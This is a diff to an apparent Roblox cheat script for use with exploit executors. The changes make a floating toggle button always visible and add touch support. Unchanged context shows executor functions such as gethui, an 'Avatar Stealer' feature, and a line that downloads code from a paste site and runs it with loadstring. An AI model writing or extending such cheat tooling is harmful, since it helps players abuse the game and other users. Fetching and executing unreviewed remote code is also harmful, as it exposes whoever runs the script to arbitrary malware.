@@ -429,37 +429,39 @@ end
 v38(t1[1]:GetService('CoreGui'))
 v38(t2[7].PlayerGui)
 
-if UserInputService.TouchEnabled and not UserInputService.MouseEnabled then
-    t1[1] = Instance.new('ScreenGui')
+t1[1] = Instance.new('ScreenGui')
 
-    local ImageButton = Instance.new('ImageButton')
-    local UICorner = Instance.new('UICorner')
-    local CoreGui = game.CoreGui
+local ImageButton = Instance.new('ImageButton')
+local UICorner = Instance.new('UICorner')
+local CoreGui = game:GetService('CoreGui')
 
-    t1[1].Parent = CoreGui
+t1[1].Name = 'UniversalToggleGui'
+t1[1].Parent = gethui and gethui() or CoreGui
 
-    local Sibling = Enum.ZIndexBehavior.Sibling
+local Sibling = Enum.ZIndexBehavior.Sibling
 
-    t1[1].ZIndexBehavior = Sibling
-    ImageButton.Parent = t1[1]
-    ImageButton.BackgroundColor3 = Color3.fromRGB(1, 1, 1)
-    ImageButton.BackgroundTransparency = 1
-    ImageButton.BorderSizePixel = 0
-    ImageButton.Position = UDim2.new(3.390842095996E-7, 209, 0, -47)
-    ImageButton.Size = UDim2.new(0, 45, 0, 45)
-    ImageButton.Draggable = true
-    ImageButton.Image = 'http://www.roblox.com/asset/?id=113136039614918'
-    UICorner.CornerRadius = UDim.new(1, 0)
-    UICorner.Parent = ImageButton
+t1[1].ZIndexBehavior = Sibling
+ImageButton.Parent = t1[1]
+ImageButton.BackgroundColor3 = Color3.fromRGB(1, 1, 1)
+ImageButton.BackgroundTransparency = 1
+ImageButton.BorderSizePixel = 0
+ImageButton.Position = UDim2.new(0, 209, 0, 50)
+ImageButton.Size = UDim2.new(0, 45, 0, 45)
+ImageButton.Draggable = true
+ImageButton.Image = 'http://www.roblox.com/asset/?id=113136039614918'
+UICorner.CornerRadius = UDim.new(1, 0)
+UICorner.Parent = ImageButton
 
-    ImageButton.MouseButton1Down:Connect(function()
-        local VirtualInputManager = game:GetService('VirtualInputManager')
+local function triggerToggle()
+    local VirtualInputManager = game:GetService('VirtualInputManager')
 
-        VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.End, false, game)
-        task.wait(0.1)
-        VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.End, false, game)
-    end)
+    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.End, false, game)
+    task.wait(0.1)
+    VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.End, false, game)
 end
+
+ImageButton.MouseButton1Down:Connect(triggerToggle)
+ImageButton.TouchTap:Connect(triggerToggle)
 
 local v43 = loadstring(game:HttpGet('https://p.ip.fi/MzAW.txt'))()
 
@@ -2793,7 +2795,8 @@ v85:AddButton({
             return
         end
 
-        t2[8]:Notify({
+        
+                t2[8]:Notify({
             Title = 'Avatar Stealer',
             Content = 'Swapping avatar...',
             Duration = 1,
@@ -3548,3 +3551,4 @@ task.defer(function()
         end)
     end
 end)
+
